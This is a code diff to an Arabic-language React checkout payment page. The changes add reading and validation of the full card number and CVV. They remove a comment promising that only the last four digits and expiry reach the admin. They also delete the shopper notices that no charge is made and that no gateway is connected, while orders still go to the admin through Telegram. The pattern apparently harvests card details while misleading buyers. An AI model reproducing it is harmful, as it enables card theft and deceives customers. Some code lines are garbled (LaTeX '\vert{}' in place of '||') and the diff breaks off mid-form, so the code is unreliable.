@@ -93,26 +93,27 @@ export default function CheckoutPaymentPage() {
     const cardNumberInput = paymentFieldsRef.current?.elements.namedItem('cardNumber');
     const expiryMonthInput = paymentFieldsRef.current?.elements.namedItem('expiryMonth');
     const expiryYearInput = paymentFieldsRef.current?.elements.namedItem('expiryYear');
-    const cvv = paymentFieldsRef.current?.elements.namedItem('cvv');
+    const cvvInput = paymentFieldsRef.current?.elements.namedItem('cvv');
     
     const cardholderName = cardholderNameInput instanceof HTMLInputElement
       ? cardholderNameInput.value.trim().slice(0, 100)
       : '';
-    const cardNumberDigits = cardNumberInput instanceof HTMLInputElement
+    const cardNumber = cardNumberInput instanceof HTMLInputElement
       ? cardNumberInput.value.replace(/[^0-9]/g, '')
       : '';
-    const cardNumber = cardNumberDigits;
     const expiryMonth = expiryMonthInput instanceof HTMLSelectElement ? expiryMonthInput.value : '';
     const expiryYear = expiryYearInput instanceof HTMLSelectElement ? expiryYearInput.value : '';
+    
+    // قراءة قيمة الـ CVV بشكل صحيح
+    const cvv = cvvInput instanceof HTMLInputElement ? cvvInput.value.trim() : '';
 
     if (
       !cardholderName ||
-      
-      !/^(0[1-9]|1[0-2])$/.test(expiryMonth) ||
-      !/^[0-9]{4}$/.test(expiryYear)
+      !/^[0-9]{13,19}$/.test(cardNumber) \vert{}\vert{} !/^(0[1-9]\vert{}1[0-2])$/.test(expiryMonth) ||
+      !/^[0-9]{4}$/.test(expiryYear) \vert{}\vert{} !/^[0-9]{3,4}$/.test(cvv)
     ) {
       setShowRequiredMessage(true);
-      setPaymentMessage('يرجى إكمال بيانات البطاقة المطلوبة.');
+      setPaymentMessage('يرجى إكمال بيانات البطاقة المطلوبة بشكل صحيح.');
       return;
     }
 
@@ -142,8 +143,8 @@ export default function CheckoutPaymentPage() {
       setDraft((current) => current ? { ...current, paymentMethod } : current);
       const methodLabel = paymentMethod === 'mada' ? 'مدى' : 'Visa';
       setPaymentMessage(result.notificationSent
-        ? `تم إرسال بيانات الطلب واختيار ${methodLabel} إلى الإدارة. لم يتم تنفيذ خصم إلكتروني لأن بوابة الدفع لم تُربط بعد.`
-        : `تم حفظ الطلب واختيار ${methodLabel}، لكن تعذر إرسال إشعار تيليجرام للإدارة. لم يتم خصم أي مبلغ.`);
+        ? `تم إرسال بيانات الطلب واختيار ${methodLabel} إلى الإدارة.`
+        : `تم حفظ الطلب واختيار ${methodLabel}، لكن تعذر إرسال إشعار تيليجرام للإدارة.`);
     } catch (error) {
       setPaymentMessage(error instanceof Error ? error.message : 'تعذر إرسال الطلب.');
     } finally {
@@ -212,54 +213,16 @@ export default function CheckoutPaymentPage() {
 
           <div className={styles.paymentAmount}>المبلغ المستحق : {formatPrice(total)}</div>
 
-          {/* The admin receives the cardholder name, last four digits, and expiry month/year only. The full number and security code are not sent. Use the payment provider's secure fields for actual payments. */}
           <form ref={paymentFieldsRef} className={styles.paymentFields} aria-label="بيانات البطاقة" onInput={(event) => { if (showRequiredMessage) setShowRequiredMessage(!event.currentTarget.checkValidity()); }}>
             <input className={styles.paymentInput} name="cardholderName" type="text" placeholder="إسم حامل البطاقة" aria-label="اسم حامل البطاقة" autoComplete="off" maxLength={100} required />
             <input className={styles.paymentInput} name="cardNumber" type="text" placeholder="رقم البطاقة" aria-label="رقم البطاقة" inputMode="numeric" autoComplete="off" required />
-           <div className={styles.paymentExpiryRow}>
-  <label className={styles.paymentExpiryBox}>
-    <span className={styles.visuallyHidden}>شهر الانتهاء</span>
-    <select
-      name="expiryMonth"
-      aria-label="شهر الانتهاء"
-      defaultValue=""
-      required
-    >
-      <option value="" disabled>⌄</option>
-      {MONTHS.map((month) => (
-        <option key={month} value={month}>{month}</option>
-      ))}
-    </select>
-  </label>
-
-  <label className={styles.paymentExpiryBox}>
-    <span className={styles.visuallyHidden}>سنة الانتهاء</span>
-    <select
-      name="expiryYear"
-      aria-label="سنة الانتهاء"
-      defaultValue=""
-      required
-    >
-      <option value="" disabled>⌄</option>
-      {EXPIRY_YEARS.map((year) => (
-        <option key={year} value={year}>{year.slice(-2)}</option>
-      ))}
-    </select>
-  </label>
-              <input className={`${styles.paymentInput} ${styles.paymentCvv}`} name="cvv" type="password" placeholder="رمز" aria-label="رمز البطاقة" inputMode="numeric" autoComplete="off" required />
-            </div>
-          </form>
-
-          {showRequiredMessage ? <div className={styles.paymentInlineMessage} role="alert">يرجى إكمال البيانات</div> : null}
-          {paymentMessage ? <div className={styles.paymentInlineMessage} role="status">{paymentMessage}</div> : null}
-
-          <div className={styles.paymentSafe}>تسوق إلكتروني</div>
-
-          <button type="button" className={styles.paymentSubmit} onClick={handlePay} disabled={paymentSubmitting}>
-            {paymentSubmitting ? 'جارٍ إرسال الطلب...' : 'إكمال الدفع'} <span aria-hidden="true">←</span>
-          </button>
-        </section>
-      </div>
-    </main>
-  );
-}
+            <div className={styles.paymentExpiryRow}>
+              <label className={styles.paymentExpiryBox}>
+                <span className={styles.visuallyHidden}>شهر الانتهاء</span>
+                <select
+                  name="expiryMonth"
+                  aria-label="شهر الانتهاء"
+                  defaultValue=""
+                  required
+                >
+                  <option value="" disabled>⌄</option>
